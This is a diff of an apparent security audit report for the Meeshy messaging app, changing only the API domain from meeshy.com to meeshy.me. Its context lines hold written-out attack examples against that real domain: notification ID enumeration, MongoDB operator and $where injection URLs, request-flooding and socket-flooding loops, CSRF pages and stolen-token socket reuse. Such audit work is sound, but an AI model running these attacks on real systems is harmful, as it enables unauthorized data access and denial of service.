@@ -269,7 +269,7 @@ fastify.delete('/notifications/read', {
 ```bash
 # ATTACK 1: Access other users' notifications
 # Attacker (userId=attacker123) tries to access victim's notification
-curl -X PATCH https://api.meeshy.com/notifications/VICTIM_NOTIFICATION_ID/read \
+curl -X PATCH https://api.meeshy.me/notifications/VICTIM_NOTIFICATION_ID/read \
   -H "Authorization: Bearer ATTACKER_TOKEN"
 
 # Response: 404 (but attacker learns notification doesn't belong to them)
@@ -284,7 +284,7 @@ curl -X PATCH https://api.meeshy.com/notifications/VICTIM_NOTIFICATION_ID/read \
 # ATTACK 3: Notification ID enumeration
 for id in {1..1000000}; do
   response=$(curl -s -o /dev/null -w "%{http_code}" \
-    -X PATCH https://api.meeshy.com/notifications/$id/read \
+    -X PATCH https://api.meeshy.me/notifications/$id/read \
     -H "Authorization: Bearer ATTACKER_TOKEN")
 
   if [ "$response" != "404" ]; then
@@ -499,27 +499,27 @@ fastify.get('/notifications', {
 ```bash
 # ATTACK 1: MongoDB Operator Injection
 # Bypass type filter using $ne operator
-curl "https://api.meeshy.com/notifications?type[$ne]=system"
+curl "https://api.meeshy.me/notifications?type[$ne]=system"
 # Returns all notifications EXCEPT system type
 
 # ATTACK 2: Regex injection for pattern matching
-curl "https://api.meeshy.com/notifications?type[$regex]=.*"
+curl "https://api.meeshy.me/notifications?type[$regex]=.*"
 # Returns all notifications regardless of type
 
 # ATTACK 3: $where injection (most dangerous)
-curl "https://api.meeshy.com/notifications?type[$where]=this.type=='system'||this.isRead==false"
+curl "https://api.meeshy.me/notifications?type[$where]=this.type=='system'||this.isRead==false"
 # Executes arbitrary JavaScript on MongoDB server
 
 # ATTACK 4: DoS via excessive limit
-curl "https://api.meeshy.com/notifications?limit=999999999"
+curl "https://api.meeshy.me/notifications?limit=999999999"
 # Forces server to fetch millions of records → memory exhaustion
 
 # ATTACK 5: Negative offset/limit manipulation
-curl "https://api.meeshy.com/notifications?page=-1&limit=-100"
+curl "https://api.meeshy.me/notifications?page=-1&limit=-100"
 # Causes unexpected behavior in pagination logic
 
 # ATTACK 6: Type confusion attack
-curl "https://api.meeshy.com/notifications?type[]=system&type[]=new_message"
+curl "https://api.meeshy.me/notifications?type[]=system&type[]=new_message"
 # Passes array instead of string → potential injection
 ```
 
@@ -832,7 +832,7 @@ private shouldCreateMentionNotification(senderId: string, recipientId: string): 
 # ATTACK 1: API endpoint flooding
 # Spam the notifications endpoint to exhaust server resources
 for i in {1..100000}; do
-  curl -X GET "https://api.meeshy.com/notifications?page=$i" \
+  curl -X GET "https://api.meeshy.me/notifications?page=$i" \
     -H "Authorization: Bearer $TOKEN" &
 done
 # Result: Server CPU/memory exhaustion, service degradation
@@ -840,7 +840,7 @@ done
 # ATTACK 2: Database resource exhaustion
 # Trigger expensive queries with large limits
 while true; do
-  curl "https://api.meeshy.com/notifications?limit=100&page=$RANDOM" \
+  curl "https://api.meeshy.me/notifications?limit=100&page=$RANDOM" \
     -H "Authorization: Bearer $TOKEN"
 done
 # Result: MongoDB connection pool exhaustion, slow queries
@@ -848,7 +848,7 @@ done
 # ATTACK 3: Notification spam
 # Create thousands of notifications via message sends
 for i in {1..10000}; do
-  curl -X POST "https://api.meeshy.com/messages" \
+  curl -X POST "https://api.meeshy.me/messages" \
     -H "Authorization: Bearer $TOKEN" \
     -d "{\"content\":\"Spam $i\",\"conversationId\":\"$TARGET\"}"
 done
@@ -857,7 +857,7 @@ done
 # ATTACK 4: Bulk operation abuse
 # Repeatedly delete all read notifications
 while true; do
-  curl -X DELETE "https://api.meeshy.com/notifications/read" \
+  curl -X DELETE "https://api.meeshy.me/notifications/read" \
     -H "Authorization: Bearer $TOKEN"
   sleep 0.1
 done
@@ -868,7 +868,7 @@ done
 for i in {1..5000}; do
   node -e "
     const io = require('socket.io-client');
-    const socket = io('wss://api.meeshy.com', {
+    const socket = io('wss://api.meeshy.me', {
       auth: { token: '$TOKEN' }
     });
   " &
@@ -1223,7 +1223,7 @@ chrome.storage.local.get(['meeshy-notifications-v2'], (result) => {
 
 // ATTACK 4: CSRF + localStorage read
 // If same-origin policy is bypassed:
-<iframe src="https://meeshy.com"></iframe>
+<iframe src="https://meeshy.me"></iframe>
 <script>
   const iframe = document.querySelector('iframe');
   iframe.onload = () => {
@@ -1425,7 +1425,7 @@ export const useAuthStore = create<AuthStore>((set) => ({
 const ContentSecurityPolicy = `
   default-src 'self';
   script-src 'self' 'unsafe-eval' 'unsafe-inline';
-  connect-src 'self' wss://api.meeshy.com https://api.meeshy.com;
+  connect-src 'self' wss://api.meeshy.me https://api.meeshy.me;
   img-src 'self' data: blob: https:;
   style-src 'self' 'unsafe-inline';
   font-src 'self';
@@ -1590,7 +1590,7 @@ const createNotificationSchema = z.object({
 **Attack Scenario**:
 ```bash
 # Attacker sends extra fields
-curl -X POST https://api.meeshy.com/notifications/test \
+curl -X POST https://api.meeshy.me/notifications/test \
   -H "Authorization: Bearer $TOKEN" \
   -d '{
     "type": "system",
@@ -1682,7 +1682,7 @@ const newSocket = io(APP_CONFIG.getBackendUrl(), {
 const oldToken = localStorage.getItem('auth-token');
 
 // Connects with stolen token
-const maliciousSocket = io('wss://api.meeshy.com', {
+const maliciousSocket = io('wss://api.meeshy.me', {
   auth: { token: oldToken }
 });
 
@@ -1763,7 +1763,7 @@ Error messages leak internal system details including database structure, file p
 **Attack Scenario**:
 ```bash
 # Trigger error with malformed input
-curl "https://api.meeshy.com/notifications?type='\"><script>alert(1)</script>"
+curl "https://api.meeshy.me/notifications?type='\"><script>alert(1)</script>"
 
 # Response in dev mode:
 {
@@ -2021,12 +2021,12 @@ No CSRF tokens on state-changing operations, allowing cross-site request forgery
 <!-- Attacker's website -->
 <html>
 <body>
-  <img src="https://api.meeshy.com/notifications/read-all"
+  <img src="https://api.meeshy.me/notifications/read-all"
        style="display:none">
 
   <script>
     // Victim visits attacker site while logged into Meeshy
-    fetch('https://api.meeshy.com/notifications/read-all', {
+    fetch('https://api.meeshy.me/notifications/read-all', {
       method: 'PATCH',
       credentials: 'include'  // Sends auth cookies
     });
@@ -2092,7 +2092,7 @@ No enforcement of maximum connections per user, allowing resource exhaustion.
 ```javascript
 // Attacker opens 1000 browser tabs
 for (let i = 0; i < 1000; i++) {
-  const socket = io('wss://api.meeshy.com', {
+  const socket = io('wss://api.meeshy.me', {
     auth: { token: validToken },
     reconnection: true,
     reconnectionAttempts: Infinity
